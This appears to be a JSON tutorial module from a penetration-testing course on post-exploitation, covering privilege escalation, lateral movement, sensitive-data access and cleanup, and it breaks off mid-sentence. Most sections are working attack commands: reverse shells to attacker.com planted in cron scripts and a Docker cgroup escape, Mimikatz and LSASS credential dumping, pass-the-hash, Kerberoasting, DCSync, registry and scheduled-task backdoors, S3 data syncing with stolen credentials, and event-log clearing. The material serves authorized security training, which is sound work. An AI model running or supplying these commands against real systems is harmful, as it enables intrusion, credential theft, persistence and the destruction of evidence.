{
  "id": "post_exploitation",
  "title": "Post-Exploitation",
  "description": "Comprehensive post-exploitation phase covering privilege escalation, lateral movement, data access validation, and cleanup procedures",
  "type": "tutorial",
  "steps": [
    {
      "id": "privilege-escalation",
      "title": "Privilege escalation",
      "content": "OBJECTIVE: Escalate from limited user access to administrator/root privileges through exploitation of misconfigurations, vulnerabilities, or weak controls.\n\nACADEMIC BACKGROUND:\nMITRE ATT&CK TA0004 (Privilege Escalation) documents elevation techniques across platforms. PTES Post-Exploitation phase emphasizes privilege escalation as critical for demonstrating full system compromise. CWE-269 (Improper Privilege Management) and CWE-250 (Execution with Unnecessary Privileges) are common weaknesses. NIST SP 800-53 AC-6 mandates least privilege principles.\n\nSTEP-BY-STEP PROCESS:\n\n1. Current Privilege Assessment:\n```bash\n# Linux privilege enumeration:\nid\nwhoami\ngroups\nsudo -l  # List sudo permissions\ncat /etc/sudoers 2>/dev/null\ncat /etc/group | grep sudo\n\n# Writable directories:\nfind / -writable -type d 2>/dev/null | grep -v proc\n\n# SUID/SGID binaries:\nfind / -perm -4000 -type f 2>/dev/null  # SUID\nfind / -perm -2000 -type f 2>/dev/null  # SGID\n\n# Capabilities:\ngetcap -r / 2>/dev/null\n\n# Windows privilege enumeration:\nwhoami /all\nnet user %username%\nnet localgroup administrators\nwhoami /priv  # Check for SeImpersonate, SeDebug, etc.\n```\n\n2. Linux Privilege Escalation - Kernel Exploits:\n```bash\n# Check kernel version:\nuname -a\ncat /etc/issue\ncat /etc/*-release\n\n# Search for kernel exploits:\nsearchsploit linux kernel | grep -i \"privilege escalation\"\nsearchsploit linux kernel 4.15  # Specific version\n\n# DirtyCOW (CVE-2016-5195) - works on kernels before 4.8.3:\ngcc -pthread dirty.c -o dirty -lcrypt\n./dirty newpassword\n\n# Baron Samedit (CVE-2021-3156) - sudo vulnerability:\nsudoedit -s /\n# Grants root shell on vulnerable sudo versions < 1.9.5p2\n```\n\n3. Linux Privilege Escalation - Sudo Misconfigurations:\n```bash\n# Check sudo permissions:\nsudo -l\n\n# Common sudo bypasses:\n# If (ALL, !root) NOPASSWD: /bin/bash:\nsudo -u#-1 /bin/bash  # CVE-2019-14287\n\n# Sudo with LD_PRELOAD:\n# If env_keep+=LD_PRELOAD in sudoers:\n# Create malicious library, load via LD_PRELOAD\n\n# GTFOBins for sudo abuse:\n# https://gtfobins.github.io/\n# Example: sudo find /etc -exec /bin/bash \\;\n```\n\n4. Linux Privilege Escalation - SUID Binaries:\n```bash\n# Find SUID binaries:\nfind / -perm -4000 -type f -exec ls -la {} 2>/dev/null \\;\n\n# Common vulnerable SUID binaries:\n# nmap (older versions):\nnmap --interactive\n!sh\n\n# find with exec:\nfind /tmp -exec /bin/bash -p \\;\n\n# vim with sudo:\nsudo vim -c ':!/bin/bash'\n\n# less/more with sudo:\nsudo less /etc/hosts\n!/bin/bash\n```\n\n5. Linux Privilege Escalation - Cron Jobs:\n```bash\n# List cron jobs:\ncat /etc/crontab\nls -la /etc/cron.*\ncrontab -l\ncat /var/spool/cron/crontabs/*\n\n# Writable cron scripts:\nfind /etc/cron* -type f -writable\n\n# If cron job runs as root and script is writable:\necho 'bash -i >& /dev/tcp/attacker.com/4444 0>&1' >> /path/to/cron_script.sh\n# Wait for cron execution, catch reverse shell as root\n```\n\n6. Windows Privilege Escalation - Token Impersonation:\n```bash\n# Check for SeImpersonatePrivilege:\nwhoami /priv\n\n# If SeImpersonate enabled, use Juicy Potato (Windows Server 2016/2019):\nJuicyPotato.exe -l 1337 -p c:\\windows\\system32\\cmd.exe -a \"/c whoami > C:\\temp\\output.txt\" -t *\n\n# PrintSpoofer (Windows 10/Server 2019+):\nPrintSpoofer.exe -i -c cmd\n\n# RoguePotato:\nRoguePotato.exe -r attacker_ip -e \"cmd.exe\" -l 9999\n```\n\n7. Windows Privilege Escalation - Service Misconfigurations:\n```bash\n# Enumerate services with weak permissions:\nsc query state=all\naccesschk.exe /accepteula -uwcqv \"Authenticated Users\" *\n\n# Unquoted service paths:\nwmic service get name,displayname,pathname,startmode | findstr /i \"auto\" | findstr /i /v \"c:\\windows\\\" | findstr /i /v \"\\\"\"\n\n# If service runs as SYSTEM with unquoted path:\n# C:\\Program Files\\Vulnerable App\\service.exe\n# Create: C:\\Program.exe\n# Service restart will execute C:\\Program.exe as SYSTEM\n\n# Modify service binary (if writable):\nsc config VulnService binpath= \"C:\\temp\\reverse_shell.exe\"\nsc stop VulnService\nsc start VulnService\n```\n\n8. Windows Privilege Escalation - Credential Harvesting:\n```bash\n# Dump SAM database:\nreg save HKLM\\SAM C:\\temp\\sam\nreg save HKLM\\SYSTEM C:\\temp\\system\n\n# Extract hashes with secretsdump.py (Impacket):\nsecretsdump.py -sam sam -system system LOCAL\n\n# Mimikatz (if running as admin):\nmimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\"\n\n# LaZagne (multi-purpose credential extractor):\nlaZagne.exe all\n\n# Check for stored credentials:\ncmdkey /list\nrunas /savecred /user:administrator cmd.exe\n```\n\n9. Docker Escape (Container Privilege Escalation):\n```bash\n# Check if inside Docker container:\ncat /proc/1/cgroup | grep docker\nls -la /.dockerenv\n\n# Privileged container escape:\n# If --privileged flag used:\nmkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp\necho 1 > /tmp/cgrp/notify_on_release\nhost_path=`sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab`\necho \"$host_path/cmd\" > /tmp/cgrp/release_agent\necho '#!/bin/sh' > /cmd\necho 'bash -i >& /dev/tcp/attacker.com/4444 0>&1' >> /cmd\nchmod a+x /cmd\nsh -c \"echo \\$\\$ > /tmp/cgrp/cgroup.procs\"\n```\n\n10. Automated Enumeration Scripts:\n```bash\n# LinPEAS (Linux):\ncurl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh\n\n# WinPEAS (Windows):\nwinPEASx64.exe\n\n# Linux Smart Enumeration (LSE):\nwget https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh\nchmod +x lse.sh\n./lse.sh -l 2  # Level 2 enumeration\n\n# PowerUp (Windows PowerShell):\npowershell -ep bypass\nImport-Module .\\PowerUp.ps1\nInvoke-AllChecks\n```\n\nWHAT TO LOOK FOR:\n- **Kernel Vulnerabilities**: Outdated kernels with public privesc exploits (DirtyCOW, Dirty Pipe)\n- **Sudo Misconfigurations**: NOPASSWD entries, wildcard permissions, dangerous binaries in sudo\n- **SUID Binaries**: Custom applications with SUID bit set, GTFOBins-listed binaries\n- **Writable Cron Jobs**: Root cron scripts writable by low-privilege users\n- **Windows Tokens**: SeImpersonate/SeDebug privileges enabling impersonation attacks\n- **Unquoted Service Paths**: Windows services with spaces in paths without quotes\n- **Stored Credentials**: Plaintext passwords in config files, registry, or credential managers\n- **Weak File Permissions**: /etc/shadow readable, service binaries writable\n\nSECURITY IMPLICATIONS:\n- **Full System Compromise**: Root/SYSTEM access enables complete control over affected systems\n- **Persistence**: Elevated privileges allow installation of rootkits, backdoors, persistence mechanisms\n- **Lateral Movement**: Admin credentials facilitate movement to other network systems\n- **Data Exfiltration**: Access to all files including sensitive databases, credentials, proprietary data\n- **Compliance Violations**: Privilege escalation demonstrates failure of least privilege (NIST AC-6, ISO 27001 A.9.2)\n\nCOMMON PITFALLS:\n- **Modern Protections**: SELinux, AppArmor, SMEP, SMAP, ASLR, DEP mitigate many privesc techniques\n- **Patched Systems**: Current kernels and updated software eliminate known vulnerabilities\n- **EDR Detection**: Endpoint security detects mimikatz, privilege escalation attempts, suspicious processes\n- **Limited Context**: Some techniques require specific configurations or vulnerable software versions\n- **Loud Techniques**: Kernel exploits may crash systems; credential dumping triggers alerts\n\nTOOLS REFERENCE:\n- **LinPEAS**: https://github.com/carlospolop/PEASS-ng (Linux enumeration)\n- **WinPEAS**: https://github.com/carlospolop/PEASS-ng (Windows enumeration)\n- **GTFOBins**: https://gtfobins.github.io/ (Unix binary exploitation)\n- **LOLBAS**: https://lolbas-project.github.io/ (Living Off The Land Binaries - Windows)\n- **PowerUp**: https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc\n- **Mimikatz**: https://github.com/gentilkiwi/mimikatz (Windows credential extraction)\n- **Impacket**: https://github.com/fortra/impacket (Python security tools)\n\nFURTHER READING:\n- MITRE ATT&CK TA0004 Privilege Escalation: https://attack.mitre.org/tactics/TA0004/\n- PayloadsAllTheThings Privesc: https://github.com/swisskyrepo/PayloadsAllTheThings\n- HackTricks Privilege Escalation: https://book.hacktricks.xyz/\n- Windows Privilege Escalation Guide: https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/",
      "tags": [
        "post-exploitation",
        "privilege-escalation",
        "pentesting",
        "security-assessment"
      ],
      "related_tools": [
        "windows-exploit-suggester",
        "linux-smart-enumeration",
        "linux-exploit-suggester",
        "aircrack-ng",
        "unix-privesc-check"
      ]
    },
    {
      "id": "lateral-movement",
      "title": "Lateral movement",
      "content": "OBJECTIVE: Move laterally through the network from compromised hosts to access additional systems, escalate privileges across the domain, and expand access footprint.\n\nACADEMIC BACKGROUND:\nMITRE ATT&CK TA0008 (Lateral Movement) documents network traversal techniques. NIST SP 800-53 AC-4 addresses information flow enforcement to prevent lateral movement. Network segmentation (CIS Controls 12) aims to limit lateral movement impact.\n\nSTEP-BY-STEP PROCESS:\n\n1. Internal Network Reconnaissance:\n```bash\n# Discover internal hosts:\nnmap -sn 192.168.1.0/24\narp -a\nip neighbor show\n\n# Enumerate domain:\nnet view /domain\nnltest /dclist:\nldapsearch -x -h dc.domain.com -b \"dc=domain,dc=com\"\n```\n\n2. Credential Harvesting from Compromised Host:\n```bash\n# Linux credentials:\ncat /etc/shadow\ncat /home/*/.bash_history | grep password\nfind / -name \"*.conf\" -exec grep -i password {} \\; 2>/dev/null\ncat ~/.ssh/id_rsa  # SSH private keys\n\n# Windows credentials:\nmimikatz \"sekurlsa::logonpasswords\" \"exit\"\nprocdump.exe -ma lsass.exe lsass.dmp  # Dump LSASS\npypykatz lsa minidump lsass.dmp  # Parse offline\n```\n\n3. Pass-the-Hash (Windows):\n```bash\n# Using Impacket:\npsexec.py -hashes :ntlmhash administrator@192.168.1.100\nwmiexec.py -hashes :ntlmhash administrator@192.168.1.100\n\n# CrackMapExec:\ncrackmapexec smb 192.168.1.0/24 -u administrator -H ntlmhash --shares\ncrackmapexec smb 192.168.1.100 -u administrator -H ntlmhash -x \"whoami\"\n```\n\n4. Remote Code Execution on Internal Systems:\n```bash\n# PSExec (Windows):\npsexec.py domain/user:password@192.168.1.100 cmd.exe\n\n# WMI Execution:\nwmiexec.py domain/user:password@192.168.1.100\n\n# SSH with harvested keys:\nssh -i stolen_key user@internal_host\n\n# RDP access:\nxfreerdp /u:administrator /p:password /v:192.168.1.100\nrdesktop -u administrator -p password 192.168.1.100:3389\n```\n\n5. Active Directory Exploitation:\n```bash\n# Kerberoasting (extract service account hashes):\nGetUserSPNs.py domain.com/user:password -request -dc-ip 10.0.0.1\nhashcat -m 13100 tgs_hashes.txt /usr/share/wordlists/rockyou.txt\n\n# AS-REP Roasting (accounts without Kerberos pre-auth):\nGetNPUsers.py domain.com/ -usersfile users.txt -format hashcat -dc-ip 10.0.0.1\n\n# DCSync (replicate domain controller):\nsecretsdump.py domain.com/administrator:password@dc.domain.com -just-dc-user krbtgt\n```\n\n6. Pivoting Through Compromised Host:\n```bash\n# SSH tunneling:\nssh -L 8080:internal-server:80 user@compromised-host\n# Access http://localhost:8080 to reach internal-server\n\n# Chisel (HTTP tunnel):\n# On attacker machine:\nchisel server -p 9000 --reverse\n# On compromised host:\nchisel client attacker.com:9000 R:3389:internal-host:3389\n\n# Metasploit pivoting:\nroute add 192.168.1.0 255.255.255.0 1  # Session 1\nuse auxiliary/scanner/portscan/tcp\nset RHOSTS 192.168.1.0/24\nrun\n```\n\n7. Persistence on Additional Systems:\n```bash\n# SSH authorized_keys:\necho \"attacker_public_key\" >> /home/user/.ssh/authorized_keys\n\n# Windows scheduled tasks:\nschtasks /create /tn \"Windows Update\" /tr \"C:\\temp\\backdoor.exe\" /sc onlogon /ru SYSTEM\n\n# Registry Run keys:\nreg add \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v Backdoor /t REG_SZ /d \"C:\\temp\\backdoor.exe\"\n```\n\n8. Documenting Network Access:\n```bash\n# Create network diagram:\n# Document compromised hosts, access paths, credentials used\necho \"Lateral Movement Path:\nwebserver01 (10.0.1.10) → SSH → appserver02 (10.0.2.20)\nappserver02 → RDP → dbserver03 (10.0.3.30)\ndbserver03 → SMB → fileserver04 (10.0.4.40)\nCredentials Used: admin:Password123 (reused across all systems)\" > lateral_movement.txt\n```\n\nWHAT TO LOOK FOR:\n- **Password Reuse**: Same credentials working across multiple systems\n- **Domain Admin Accounts**: High-value targets for network-wide access\n- **Unpatched Systems**: Vulnerable internal hosts for exploitation\n- **Weak Network Segmentation**: Flat networks allowing unrestricted lateral movement\n- **Service Accounts**: Over-privileged accounts with access to multiple systems\n\nSECURITY IMPLICATIONS:\n- **Network-Wide Compromise**: Lateral movement enables access to entire infrastructure\n- **Data Breach Escalation**: Access to database servers, file servers, backup systems\n- **Persistence Across Network**: Multiple compromised systems increase attacker resilience\n- **Compliance Impact**: Lateral movement demonstrates inadequate network segmentation (PCI DSS 1.3, CIS Control 12)\n\nCOMMON PITFALLS:\n- **Network Segmentation**: VLANs, firewalls limit lateral movement paths\n- **MFA Requirements**: Multi-factor authentication blocks credential reuse\n- **Monitoring Detection**: Lateral movement generates security alerts in SIEM\n- **Limited Credentials**: Harvested credentials may have restricted network access\n\nTOOLS REFERENCE:\n- **CrackMapExec**: https://github.com/Porchetta-Industries/CrackMapExec\n- **Impacket**: https://github.com/fortra/impacket\n- **Chisel**: https://github.com/jpillora/chisel (Tunneling)\n- **Mimikatz**: https://github.com/gentilkiwi/mimikatz\n- **BloodHound**: https://github.com/BloodHoundAD/BloodHound (AD path analysis)\n\nFURTHER READING:\n- MITRE ATT&CK TA0008: https://attack.mitre.org/tactics/TA0008/\n- Active Directory Security: https://adsecurity.org/\n- Red Team Field Manual: https://www.amazon.com/Red-Team-Field-Manual/dp/1494295504",
      "tags": [
        "post-exploitation",
        "lateral-movement",
        "pentesting",
        "security-assessment"
      ],
      "related_tools": [
        "recon-ng",
        "ligolo-ng",
        "playbook_multi_stage_credential_harvesting",
        "workflow_red_purple_team_collaboration",
        "ssh-portforward"
      ]
    },
    {
      "id": "data-access-validation",
      "title": "Data access validation",
      "content": "OBJECTIVE: Locate, access, and document sensitive data within compromised environments to demonstrate business impact and regulatory compliance risks.\n\nACADEMIC BACKGROUND:\nMITRE ATT&CK TA0009 (Collection) and TA0010 (Exfiltration) document data access techniques. GDPR Article 32 and HIPAA §164.312 mandate data protection controls. PCI DSS Requirement 3 addresses cardholder data protection. This step demonstrates compliance with data security requirements.\n\nSTEP-BY-STEP PROCESS:\n\n1. Automated Sensitive Data Discovery:\n```bash\n# Linux file search:\nfind / -name \"*.xlsx\" -o -name \"*.docx\" -o -name \"*.pdf\" 2>/dev/null\nfind / -name \"*password*\" -o -name \"*credential*\" -o -name \"*secret*\" 2>/dev/null\ngrep -r \"password\\|api_key\\|secret\" /var/www/ /opt/ /home/ 2>/dev/null\n\n# Windows file search:\ndir /s /b C:\\*password*.txt C:\\*credentials*.xlsx\nfindstr /si password *.txt *.xml *.ini *.config\n\n# Search for PII patterns:\ngrep -r -E \"[0-9]{3}-[0-9]{2}-[0-9]{4}\" /home/ 2>/dev/null  # SSN\ngrep -r -E \"[0-9]{16}\" /var/www/ 2>/dev/null  # Credit card numbers\n```\n\n2. Database Access and Enumeration:\n```bash\n# MySQL:\nmysql -h localhost -u root -p\nSHOW DATABASES;\nUSE customer_db;\nSHOW TABLES;\nSELECT * FROM users LIMIT 10;\nSELECT * FROM credit_cards LIMIT 5;  # Sample sensitive data\n\n# PostgreSQL:\npsql -h localhost -U postgres\n\\l  # List databases\n\\c customer_db\n\\dt  # List tables\nSELECT * FROM users LIMIT 10;\n\n# MongoDB:\nmongo\nshow dbs\nuse customer_db\nshow collections\ndb.users.find().limit(10)\n\n# MSSQL:\nsqlcmd -S localhost -U sa -P password\nSELECT name FROM sys.databases;\nUSE customer_db;\nSELECT TOP 10 * FROM users;\n```\n\n3. File Share and Network Storage Access:\n```bash\n# SMB shares enumeration:\nsmbclient -L //fileserver -U user%password\nsmbclient //fileserver/finance -U user%password\nget sensitive_document.xlsx\n\n# NFS shares:\nshowmount -e nfs_server\nmount nfs_server:/export/data /mnt/nfs\nls /mnt/nfs\n\n# Cloud storage (if credentials found):\naws s3 ls s3://company-backups/ --profile stolen\naws s3 sync s3://company-backups/ /tmp/exfil --profile stolen\n```\n\n4. Email and Communication Systems:\n```bash\n# Exchange mailbox access (if credentials available):\n# Via OWA, Outlook, or PowerShell:\nGet-Mailbox -Identity user@domain.com | Get-MailboxStatistics\n\n# Search for sensitive keywords:\nSearch-Mailbox -Identity user@domain.com -SearchQuery \"password OR confidential OR secret\"\n\n# Slack/Teams data access (if API tokens found):\ncurl -H \"Authorization: Bearer xoxb-token\" https://slack.com/api/conversations.list\ncurl -H \"Authorization: Bearer xoxb-token\" https://slack.com/api/conversations.history?channel=C123456\n```\n\n5. Backup and Archive Access:\n```bash\n# Find backup files:\nfind / -name \"*.bak\" -o -name \"*.backup\" -o -name \"*.old\" 2>/dev/null\nfind / -name \"*.sql.gz\" -o -name \"*.tar.gz\" -o -name \"*.zip\" 2>/dev/null\n\n# Extract archives:\ntar -xzf database_backup.tar.gz\nunzip sensitive_files.zip\n\n# Database backup restoration (offline analysis):\nmysql -u root -p < database_backup.sql\n```\n\n6. Source Code and Configuration Files:\n```bash\n# Git repositories:\nfind / -name \".git\" -type d 2>/dev/null\ngit log --all --full-history -- *password* *secret* *key*\n\n# Configuration files with secrets:\ncat /etc/mysql/my.cnf\ncat /var/www/html/config.php\ncat C:\\inetpub\\wwwroot\\web.config\ncat ~/.aws/credentials\n\n# Application secrets:\ncat .env\ncat application.properties\ncat appsettings.json\n```\n\n7. Data Classification and Sampling:\n```bash\n# Document data types found:\necho \"Data Classification Report:\nPII Found:\n- /home/databases/customers.sql (10,000 records with SSN, addresses)\n- /mnt/shares/HR/employee_data.xlsx (500 employee records)\n\nFinancial Data:\n- MySQL database 'payments' (5,000 credit card numbers - ENCRYPTED)\n- /backup/transactions_2024.csv (100,000 payment records)\n\nIntellectual Property:\n- /opt/source_code/ (proprietary application source)\n- /shares/patents/ (12 patent applications)\n\nAuthentication Credentials:\n- /var/www/config.php (database credentials)\n- ~/.ssh/id_rsa (SSH private keys for 3 servers)\n\nBusiness-Critical Data:\n- Customer lists, contracts, financial reports, strategic plans\" > data_classification.txt\n```\n\n8. Compliance Impact Assessment:\n```bash\n# Document regulatory implications:\necho \"Compliance Impact:\nGDPR (Article 32): Personal data of EU citizens accessible without encryption\nHIPAA: No PHI found (healthcare environment)\nPCI DSS Requirement 3: Credit card data stored but encrypted (compliant)\nSOX: Financial records accessible (quarterly reports, revenue data)\nCCPA: California resident PII accessible without controls\" > compliance_impact.txt\n```\n\n9. Evidence Collection (Non-Destructive):\n```bash\n# Take small samples, not full datasets:\nmysql -u root -p -e \"SELECT * FROM users LIMIT 5\" customer_db > sample_users.txt\nhead -20 /shares/finance/salaries.xlsx > salary_sample.txt\n\n# Screenshot database contents:\n# Capture screenshots showing table names, row counts, sample data\n\n# Hash sensitive files for verification without exfiltration:\nsha256sum /backup/database_full.sql > hash_verification.txt\n```\n\n10. Access Logging and Documentation:\n```bash\n# Document all data access:\necho \"Data Access Log:\nTimestamp: 2025-11-01 14:30:00\nSystem: dbserver01.target.com\nDatabase: customer_db\nTables Accessed: users, payments, addresses\nRecords Viewed: 50 (sample)\nExfiltration: None (samples only for demonstration)\nBusiness Impact: Full customer database accessible\nRecommendation: Encrypt at rest, implement access controls\" > data_access_log.txt\n```\n\nWHAT TO LOOK FOR:\n- **Personally Identifiable Information (PII)**: Names, SSNs, addresses, phone numbers, emails\n- **Financial Data**: Credit card numbers, bank accounts, payment history, salaries\n- **Protected Health Information (PHI)**: Medical records, patient data, diagnoses\n- **Intellectual Property**: Source code, patents, trade secrets, proprietary algorithms\n- **Authentication Credentials**: Passwords, API keys, private keys, tokens\n- **Business-Critical Data**: Customer lists, contracts, financial reports, strategic plans\n\nSECURITY IMPLICATIONS:\n- **Data Breach Liability**: Unauthorized access to PII triggers breach notification laws (GDPR, CCPA)\n- **Regulatory Fines**: GDPR fines up to €20M or 4% of revenue; HIPAA up to $1.5M per violation\n- **Identity Theft**: Exposed PII enables fraud, identity theft, social engineering attacks\n- **Intellectual Property Loss**: Trade secrets and proprietary data may be stolen by competitors\n- **Compliance Failures**: Demonstrates inadequate data protection controls (ISO 27001 A.8.2, NIST 800-53 SC-28)\n\nCOMMON PITFALLS:\n- **Encrypted Data**: Full disk encryption, database TDE, encrypted archives may protect data at rest\n- **Access Controls**: Proper file permissions, database ACLs, principle of least privilege limit access\n- **Data Loss Prevention (DLP)**: DLP tools detect and block sensitive data access patterns\n- **Legal Constraints**: Avoid actual data exfiltration; use samples and screenshots for evidence only\n- **Distributed Data**: Data spread across multiple systems, cloud services, backup locations\n\nTOOLS REFERENCE:\n- **grep/findstr**: Built-in file search tools\n- **Database Clients**: mysql, psql, mongo, sqlcmd\n- **BloodHound**: https://github.com/BloodHoundAD/BloodHound (Active Directory data mapping)\n- **LaZagne**: https://github.com/AlessandroZ/LaZagne (Credential extraction)\n\nFURTHER READING:\n- MITRE ATT&CK TA0009 Collection: https://attack.mitre.org/tactics/TA0009/\n- GDPR Article 32: https://gdpr-info.eu/art-32-gdpr/\n- PCI DSS Requirement 3: https://www.pcisecuritystandards.org/\n- HIPAA Security Rule: https://www.hhs.gov/hipaa/for-professionals/security/",
      "tags": [
        "post-exploitation",
        "data-access",
        "pentesting",
        "security-assessment"
      ],
      "related_tools": [
        "hunter-io",
        "workflow_hipaa_compliance",
        "workflow_cloud_security_assessment",
        "playbook_multi_stage_credential_harvesting",
        "workflow_pci_dss_assessment"
      ]
    },
    {
      "id": "cleanup-procedures",
      "title": "Cleanup procedures",
      "content": "OBJECTIVE: Remove all artifacts, tools, and evidence of penetration testing activities to restore systems to their pre-assessment state.\n\nACADEMIC BACKGROUND:\nPTES Post-Exploitation Cleanup emphasizes responsible testing practices. Professional penetration testing standards (CREST, OSCP) require comprehensive cleanup documentation. NIST SP 800-115 Section 9 addresses post-assessment activities including artifact removal.\n\nSTEP-BY-STEP PROCESS:\n\n1. Artifact Inventory and Documentation:\n```bash\n# Create comprehensive artifact list before cleanup:\necho \"Artifacts Created During Assessment:\nFiles Uploaded:\n- /tmp/linpeas.sh (enumeration script)\n- /var/www/html/uploads/shell.php (web shell)\n- /home/user/.ssh/authorized_keys (backdoor SSH key)\n\nProcesses Started:\n- nc -lvnp 4444 (reverse shell listener on compromised host)\n- python3 -m http.server 8000 (HTTP server for file transfer)\n\nUser Accounts Created:\n- backdoor_user (UID 1001) - Linux\n- test_admin (Administrator group) - Windows\n\nRegistry/Configuration Changes:\n- HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Backdoor\n- /etc/crontab entry for persistence\n\nNetwork Connections Established:\n- Reverse shell to attacker.com:4444\n- SSH tunnel to internal network via compromised host\" > cleanup_inventory.txt\n```\n\n2. Remove Uploaded Files and Tools:\n```bash\n# Linux file removal:\nrm -f /tmp/linpeas.sh\nrm -f /tmp/pspy64\nrm -f /var/www/html/uploads/shell.php\nrm -f /tmp/.hidden_backdoor\nrm -rf /tmp/exploit_tools/\n\n# Windows file removal:\ndel C:\\temp\\winpeas.exe\ndel C:\\inetpub\\wwwroot\\uploads\\shell.aspx\ndel C:\\Windows\\Tasks\\backdoor.exe\nrmdir /s /q C:\\temp\\tools\n\n# Verify removal:\nls -la /tmp/ /var/www/html/uploads/\ndir C:\\temp\\ C:\\inetpub\\wwwroot\\uploads\\\\\n```\n\n3. Terminate Processes and Network Connections:\n```bash\n# Kill reverse shells and listeners:\nkillall nc\npkill -f \"python.*http.server\"\npkill -f reverse_shell\n\n# Windows process termination:\ntaskkill /F /IM backdoor.exe\ntaskkill /F /IM mimikatz.exe\n\n# Close SSH tunnels:\nps aux | grep \"ssh -L\"\nkill <PID>\n\n# Verify no lingering processes:\nps aux | grep -E \"nc|chisel|metasploit|mimikatz\"\nnetstat -antup | grep ESTABLISHED\n```\n\n4. Remove User Accounts and Backdoors:\n```bash\n# Linux user removal:\nuserdel -r backdoor_user\nsed -i '/attacker_ssh_key/d' /home/*/.ssh/authorized_keys\nsed -i '/attacker_ssh_key/d' /root/.ssh/authorized_keys\n\n# Windows user removal:\nnet user backdoor_admin /delete\nreg delete \"HKLM\\SAM\\SAM\\Domains\\Account\\Users\" /f  # If created test accounts\n\n# Verify removal:\ncat /etc/passwd | grep backdoor\nnet user\n```\n\n5. Revert Configuration Changes:\n```bash\n# Remove cron jobs:\ncrontab -l  # List current crons\ncrontab -e  # Remove malicious entries\nrm -f /etc/cron.d/backdoor\n\n# Remove Windows scheduled tasks:\nschtasks /Delete /TN \"Windows Update\" /F\nschtasks /Delete /TN \"Backdoor\" /F\n\n# Remove registry persistence:\nreg delete \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v Backdoor /f\n\n# Restore modified configurations:\ngit checkout /etc/apache2/apache2.conf  # If using version control\ncp /etc/apache2/apache2.conf.bak /etc/apache2/apache2.conf  # From backup\n```\n\n6. Log Cleanup (if authorized):\n```bash\n# Linux log cleanup (ONLY if explicitly authorized):\n# Clear bash history:\nhistory -c\ncat /dev/null > ~/.bash_history\n\n# Clear auth logs (may break forensics - rarely authorized):\ncat /dev/null > /var/log/auth.log\ncat /dev/null > /var/log/apache2/access.log\n\n# Windows event log clearing (ONLY if authorized):\nwevtutil cl Security\nwevtutil cl System\nwevtutil cl Application\n\n# Note: Log manipulation is often NOT authorized and breaks incident response\n# Document what logs contain evidence rather than deleting\n```\n\n7. Database Cleanup:\n```bash\n# Remove test data inserted:\nmysql -u root -p -e \"DELETE FROM users WHERE username='test_account'\" database_name\nmysql -u root -p -e \"DROP TABLE IF EXISTS test_table\" database_name\n\n# Remove injected stored procedures:\nmysql -u root -p -e \"DROP PROCEDURE IF EXISTS malicious_proc\" database_name\n\n# Verify cleanup:\nmysql -u root -p -e \"SHOW TABLES\" database_name\n```\n\n8. Firewall and Network Rule Cleanup:\n```bash\n# Remove temporary firewall rules:\niptables -D INPUT -p tcp --dport 4444 -j ACCEPT\nufw delete allow 4444\n\n# Windows firewall:\nnetsh advfirewall firewall delete rule name=\"Backdoor Port\"\n\n# Verify no unauthorized rules remain:\niptables -L -n\nnetsh advfirewall firewall show rule name=all\n```\n\n9. Cloud and External Service Cleanup:\n```bash\n# Remove S3 buckets created for exfiltration:\naws s3 rb s3://test-exfiltration-bucket --force\n\n# Delete AWS EC2 instances spawned:\naws ec2 terminate-instances --instance-ids i-1234567890abcdef0\n\n# Revoke API keys created:\n# Azure, AWS, GCP consoles - delete test service accounts\n```\n\n10. Cleanup Verification and Documentation:\n```bash\n# Verify all artifacts removed:\nfind / -name \"*linpeas*\" -o -name \"*winpeas*\" -o -name \"*shell.php*\" 2>/dev/null\nps aux | grep -E \"nc|backdoor|reverse\"\nnetstat -antup | grep -E \"4444|reverse\"\ncrontab -l\ncat /etc/passwd | grep -E \"backdoor|test\"\n\n# Create cleanup report:\necho \"Cleanup Verification Report:\nDate: 2025-11-01 16:00:00\nPerformed By: Senior Pentester\n\nArtifacts Removed:\n✓ All uploaded tools and scripts (8 files)\n✓ Web shells and backdoors (2 files)\n✓ Reverse shell processes terminated (3 processes)\n✓ SSH tunnels closed (1 tunnel)\n✓ User accounts deleted (2 accounts)\n✓ Cron jobs removed (1 job)\n✓ Registry keys deleted (1 key)\n✓ Test database entries removed\n\nVerification Commands Executed:\n✓ find / -name \"*linpeas*\" (0 results)\n✓ ps aux | grep backdoor (0 results)\n✓ crontab -l (no malicious entries)\n✓ netstat -antup (no suspicious connections)\n\nSystem State:\n✓ Services operational (apache2, mysql, sshd)\n✓ No unauthorized accounts\n✓ No suspicious processes\n✓ Firewall rules verified\n\nRemaining Evidence (Authorized):\n- Log entries in /var/log/auth.log (for client review)\n- Network traffic captures (in assessment report)\n- Screenshots and documentation (in deliverables)\n\nClient Notification: Security team notified of cleanup completion\nNext Steps: Final report delivery, debrief meeting scheduled\" > cleanup_verification_report.txt\n```\n\nWHAT TO LOOK FOR:\n- **All Uploaded Files**: Scripts, exploits, web shells, backdoors completely removed\n- **No Running Processes**: Reverse shells, listeners, tunnels terminated\n- **Clean User Accounts**: No unauthorized or test accounts remaining\n- **Reverted Configurations**: Cron jobs, scheduled tasks, registry keys, firewall rules restored\n- **System Stability**: Services operational, no degraded performance\n- **Log Entries**: Evidence documented but artifacts removed (if authorized)\n\nSECURITY IMPLICATIONS:\n- **Professional Responsibility**: Incomplete cleanup leaves systems vulnerable and breaches contracts\n- **Ongoing Backdoors**: Left-behind persistence mechanisms may be exploited by real attackers\n- **System Instability**: Unremediated changes may cause service failures\n- **Legal Liability**: Failure to cleanup may constitute unauthorized system modification\n- **Trust Damage**: Poor cleanup practices harm client relationships and professional reputation\n\nCOMMON PITFALLS:\n- **Immutable Logs**: Centralized logging (SIEM, Splunk) cannot be modified from compromised hosts\n- **Backup Systems**: File removal doesn't affect backups taken during assessment\n- **Forensic Artifacts**: Registry hives, USN journal, $MFT retain evidence of file operations\n- **Network Traffic**: IDS/IPS logs, NetFlow data, packet captures remain on network devices\n- **Cloud Persistence**: EC2 instances, Lambda functions, S3 buckets may persist after 